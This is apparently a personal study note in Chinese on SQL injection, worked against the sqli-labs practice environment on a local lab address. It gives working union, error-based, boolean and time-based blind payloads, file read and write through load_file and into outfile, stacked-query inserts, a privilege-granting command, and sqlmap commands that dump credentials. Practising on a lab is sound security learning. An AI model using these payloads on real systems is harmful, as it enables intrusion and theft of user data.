# SQL注入

## SQL注入之手工注入：

>   系统库：
>   	information_schema	：所有系统信息都在当前库中
>
>   ​	schemata		: 所有库信息
>
>   ​	tables		：所有表信息
>
>   ​	columns		：所有列信息

*   判断有无注入点：

    *   使用**and**连接符
        *   `and 1=1 -- ' ` 当前语句返回为true
    *   使用**order by ** 来进行猜解列数
        *   `order by 1` 修改数字来进行判断是否有进行错误的回显
    *   使用**union** 来进行找到页面中的回显点
        *   `union select 1,2,3` 找到页面中的回显位置
        *   例子：`?id=1 union 1,version(),3`version处会显示当前数据库的版本
        *   `user(),version(),database()`当前用户,版本信息,以及当前数据库名称（)
        *   通过回显点找到当前数据库的库名-->security

*   进行SQL注入测试

    *   `union select 1,group_concat(schema_name),3 from information_schema.schemata`查找当前系统中存在哪些库

    *   `union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = 'security'` 查找表名
    
        ```sql
         完整URL：http://192.168.0.68:8080/Less-2/?id=-2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = 'security'
        
        参数说明：
        	使用union进行联合查询
        	使用group_concat将结果进行切割并且合并，使用逗号分隔
        	从infomation_schema.tables中查找table_name列。
        	使用where条件限定只查询'security'库的信息
        ```

    *   `union select 1,group_concat(column_name),3 from information_schema.columns where column_name = 'users'` 根据列名查找当前字段名
    
    *   ` union select 1,(select group_concat(username,0x3a,password)from users),3` 根据查找到的列名直接进行数据读取.  Tips:`0x3a`转换后的字符为冒号`:` 
    

 

## Mysql权限

`mysql`中存在4个有关权限控制的表，分别是user表，db表，tables_priv表，columns_priv表

`select * from user where user='test' and host='ipaddress' \G` 使用此命令查看test用户的数据库操作权限

`grant all privleges on *.* to 'test'@'localhost' with grant option;` 使用此命令可将普通用户test提升至管理员权限

`drop user test@'localhost' ` 删除test用户



-   查找当前数据库在系统中的读写权限

    ` show global variables like '%secure%';`

    ![image-20221210144001471](https://raw.githubusercontent.com/r0o983/images/main/image-20221210144001471.png)

​	如果secure_file_priv后的value显示为空，则代表可以读取系统中的任意文件

-   修复方案
    -   可在配置文件中进行指定路径读取与写入,配置文件路径为：`/etc/mysql/my.cnf`,在文件中添加`secure_file_priv = ''`字段，后跟具体的路径即可
    -   操作之后可以通过`pkill mysqld `将进行杀死后重启`mysql`，也可以通过`service mysql restart`来重启Mysql，但是不建议使用重启的方式（因为我试了好几次都没成功，都未能重新加载配置文件)
-   高权限读取系统内容：
    -   `http://192.168.0.68:8080/Less-2/?id=-3 union select 1,load_file('/etc/lib/mysql-files/abc'),3`当前命令可读取在`etc/lib/mysql-files`文件夹下的abc文件。
-   高权限写入系统内容:
    -   使用函数`into outfile`可将多行文本写入文件，并按格式进行输出，使用函数`into dumpfile`只可写入一行文本，切没有输出格式，使用`outfile`后不能接0x开头或者char转换之后的路径，只可使用单引号路径
    -   `http://192.168.0.68:8080/Less-2/?id=-1 union select 1,'写入内容',3 into openfile 'etc/lib/mysql-files/aabcd'--+` 
    -   Tips: 最后使用的`--+`是为了注释掉之后的SQL语句，使之不报错，需要写入的文件在写入之前是不能存在的，也就是说，需要在这里创建一个新的文件并进行写入，无法进行覆盖写入





## SQL注入类型

1.   数字型注入点
     -   判断SQL注入点，添加后缀参数进行测试，使用and符号来进行测试
     -   `$id = $_GET(id)`
     -   `$sql = 'select * from users where id = 1 and 1 = 1 limit 0,1'`
     -   将and的判断条件置为假`and 1=2` ,查看是否有返回报错信息，如果有报错信息，则可能存在SQL注入漏洞
2.   字符型注入点
     -   `$sql = 'select * from users where id ='1' and 1 = 1 limit 0,1'`
     -   在提交参数处增加一个单引号，将当前的SQL语句进行闭合，引导系统出现语法错误信息，
3.   搜索型注入点
     -   使用`like`来进行模糊查询，在输入框处进行
     -   使用百分号`%`来进行提前把SQL语句进行闭合
     -   `select * from user where like '%y%' or 1=1#%'`
     -   使用`%'` 闭合SQL语句
     -   使用`#`将当前SQL语句的后半部分给注释掉，相当于`--+`是一个意思
     -   And 1=1 条件两边都为真，or任意满足一个条件即可。
4.   XXX注入型
     -   常见的闭合符号`' " ( { `



tips：找到方法将当前的SQL语句进行闭合，尝试输入自己构建的SQL语句。

---





## SQL注入数据提交方式

-   GET方式注入
    -   get方式注入较为常见，主要是通过URL传递数据到后台，带入到数据库中进行执行，可利用联合注入方式直接进行注入
    -   利用场景：
        1.   数据不敏感--------数据传输时会直接在地址栏进行展示（速度快
        2.   安全性不高
        3.   数据长度有限（2K+35）
-   POST方式注入
    -   Post提交方式主要适用于表单的提交，用户登录框的注入
    -   方式：利用BurpSuite抓包进行重放修改内容进行，和get的差别是需要借助抓包工具进行测试。
        1.   通过表单方式直接提交到服务器
        2.   安全性较高
        3.   数据长度较大(Tomcat默认提交大小为：2M)

tips：[点我查看各大浏览器提交大小的限制](https://developer.aliyun.com/article/101173)

-   Request方式注入
    -   超全局变量PHP中的许多预定义变量都是‘超全局‘的，意味着它们在一个脚本的全部作用域中都可以用，分别是
        -   `_Request`（获取get，post，cookie）cookie在新版本中已经无法获取_POST(获取post传参)
        -   `get`（获取get传参）`_cookie`(获取cookie传参)
        -   `_server`（包含：头部信息（header），路径，以及脚本未知（script localtions）等等消息的数组
-   HTTP头注入
    -   通常http消息包括客户机向服务器的请求消息和服务器向客户机响应消息，这两种类型的消息又一个起始行，一个或者多个头域，一个只是头域结束的空行和可选的消息体组成。http的头域包括：通用头，请求头，响应头，实体头，4个部分



## SQL注入之查询方式

-   当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式导致，这个时候我们需要用到报错或者盲注进行后续操作，同时在注入的过程中，提前了解其中的SQL语句可以更好的选择对应的SQL注入语句

1.   Select 查询数据 --> 在网站应用中进行数据显示的查询操作
     -   `select * from user where id = $id `
2.   Delete 删除数据 --> 在后台管理中删除文章，删除用户等操作
     -   `delete from user where id = $id `
3.   Insert 插入数据 --> 在网站应用中进行用户注册添加操作。
     -   `inser into user (id,name,pass) values(1,'xxx','bbb')`
4.   Update 更新数据 --> 在后台数据同步或者缓存操作
     -   `update user set pass ='ccc' where id =1`



## SQL注入 报错盲注

1.   基于布尔的SQL盲注 -- 逻辑判断

     -   regexp like ascii left ord mid

2.   基于时间的SQL盲注 -- 延时判断

     -   if sleep

3.   基于报错的SQL盲注 -- 报错回显（强制性报错）

     -   函数解析：

         -   updatexml():从目标xml中更改包含所查询值的字符串

             1.   第一个参数：XML_document是String格式，为XML文档对象的名称，文中为DOC

             2.   XPath_string(Xpath格式字符串)

             3.   new_value,String格式，替换查找到符合条件的数据

                  ```mysql
                  updatexml(XML_document,XPath_String,new_value)
                  'union select 1,extractvalue(1,concat(0x7e,(select version())))%23
                  'or updatexml(1,concat(0x73,databases()),0)or'
                  ```

         -   extractvalue():从目标XML中返回包含所查询值的字符串

             1.   第一个参数：XML_document是String格式，为XML文档对象的名称，文中为DOC

             2.   XPath_string(Xpath格式字符串)

                  ```mysql
                  extractvalue(XML_document,XPath_String)
                  'or extractvalue(1,concat(0x7e,databases())) or '
                  ```

                  

函数应用：

**知识储备：**

sleep（）：                              Sleep函数可以使计算机程序（进程，任务或线程）进入休眠

if（）：                                 if 是 计算机编程语言一个关键字，分支结构的一种

mid(a,b,c):                             从b开始，截取a字符串的c位

substr(a,b,c)：                         从b开始，截取字符串a的c长度

left(database(),1),database() :         left(a,b)从左侧截取a的前b位

length(database())=8 ：                 判断长度

ord=ascii ascii(x)=100：                判断x的ascii值是否为100

在不使用sleep下查询数据所需要的时间：0.03秒

### SQL注入，（盲注）延时注入

### **使用sleep函数来进行时间盲注**

*   通过返回数据的时间来判定是否存在SQL注入漏洞

`select * from security.users where id=1 and sleep(if(database()='xx',2,3));`

*   通过查询数据库的字符长度判断是否存在SQL注入漏洞

`select * from security.users where id=1 and sleep(if(length(database()=1),3,10)); `

-   使用mid来进行猜解数据库名(注意参数内的括号位置)

`select * from users where id=1 and sleep(if(mid(database(),1,1)='s',0,10)); `

-   使用substr来进行猜解数据库名(与mid操作相同)

`select * from users where id=1 and sleep(if(substr(database(),1,1)='s',0,10));`

-   使用left来查询数据库的库名长度(从左边开始，第一个字符是什么)

`select * from users where id=1 and sleep(if(left(database(),1)='s',2,10));`

-   使用ascii码来进行对照操作（排除使用字母直接去匹配的情况）

` select * from users where id=1 and if(ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(2),0);`

### 使用boolean进行盲注

-   通过不同的运算符来进行猜解数据库名

`http://192.168.0.68:8080/Less-5/?id=2' and ascii(mid(database(),1,1))=115 -- +` 

解析：?id=2 正常输入数值为有回显，使用ascii编码测试当前数值的第一位是否与代号115的ascii值是否相等，如果页面成功有回显，则说明当前值相等，否则不相等

同理：可以使用`运算符`来使用二分法来进行判断`>`,`<`,`=`,`!=`

```sql
# 当前数据库为security--对应的第一个字母为：s(ascii=115)
http://192.168.0.68:8080/Less-5/?id=2' and ascii(mid(database(),1,1))=115 -- +  (正确)
http://192.168.0.68:8080/Less-5/?id=2' and ascii(mid(database(),1,1))!=115 -- +	（错误）
http://192.168.0.68:8080/Less-5/?id=2' and ascii(mid(database(),1,1))>116 -- +	（错误）
http://192.168.0.68:8080/Less-5/?id=2' and ascii(mid(database(),1,1))<117 -- +	（正确）

# 查找当前数据库的库名的首字母
http://192.168.0.68:8080/Less-5/?id=2' and ascii(substr((select table_schema from information_schema.tables where table_schema=database() limit 1,1),1,1))=115 -- '

## 查找当前数据库的第二个字母
http://192.168.0.68:8080/Less-5/?id=2' and ascii(substr((select table_schema from information_schema.tables where table_schema=database() limit 1,1),2,1))=101 -- '
```

注：需要mysql的版本高于5.1

`select version();`

`http://192.168.0.68:8080/Less-5/?id=2' and substr(version(),1,1)=5 --'`

### SQL注入之加解密注入

当前数据库在查询时会将用户输入的内容进行格式化后操作，比如：加入反斜杠等等,查看这里[get_magic_quotes_gpc](https://www.php.net/manual/en/function.get-magic-quotes-gpc.php)

`base64`格式来进行加密，拿到数据后在后台进行解密

```sql
# 将要插入的数据首先进行base64编码-----以下为基于Xpath的报错注入。
admin ' or extractvalue(1,concat(0x7e,(select version()))) or '
dsad ' or extractvalue(1,concat(0x7e,(select database()))) or '
```



### SQL注入之堆叠注入

原理：通过分号来闭合前一段语句，使得后面的语句可以被执行。

`192.168.0.68:8080/Less-38/index.php?id=1'; insert into users values(15,'zhangsan','zhangsan') -- '`



## SQLMAP 注入

常用指令：（get）

```shell
sqlmap -u http://192.168.0.68:8080/Less-1/?id=1
参数：-u	用于get提交方式，需要追加需要测试的参数

sqlmap -u http://192.168.0.68:8080/Less-1/?id=1 --dbs
参数：--dbs	获取所有的数据库

sqlmap -u http://192.168.0.68:8080/Less-1/?id=1 --tables
参数：--tables 获取全部的表

sqlmap -u http://192.168.0.68:8080/Less-1/?id=1 --columns
参数：--columns 获取全部的列

sqlmap -u http://192.168.0.68:8080/Less-1/?id=1 --dump
参数：--dump 获取全部的数据

sqlmap -u http://192.168.0.68:8080/Less-1/?id=1 -D security --tables
参数：-D 获取当前指定的数据库的信息

sqlmap -u http://192.168.0.68:8080/Less-1/?id=1 -D security -T users -columns
参数：-T 获取当前指定表的数据

sqlmap -u http://192.168.0.68:8080/Less-1/?id=1 -D security -T users -C "username,password"  --dump
参数：-C 获取当前表的某列的数据  

sqlmap -u http://192.168.0.68:8080/Less-1/?id=1 --dbms=mysql
参数：--dbms=mysql 指定数据库类型
```



常用指令：(post) -可以配合get里面的参数进行配合注入

```shell

sqlmap -r burp抓包的文件内容  -p uname
参数：-p 指定文件内需要测试的字段 		注(不推荐)：可以在需要测试的字段后面加上*号，即可不使用-p参数进行注入 例：uname：admin* 则会自动选择uname参数进行注入测试

sqlmap -r burp抓包的文件内容  -p uname --current-db
参数：--current-db 查找当前数据库

sqlmap -u 192.168.0.68:8080/Less-12/ --forms --current-db
参数：--forms 自动检测表单

```

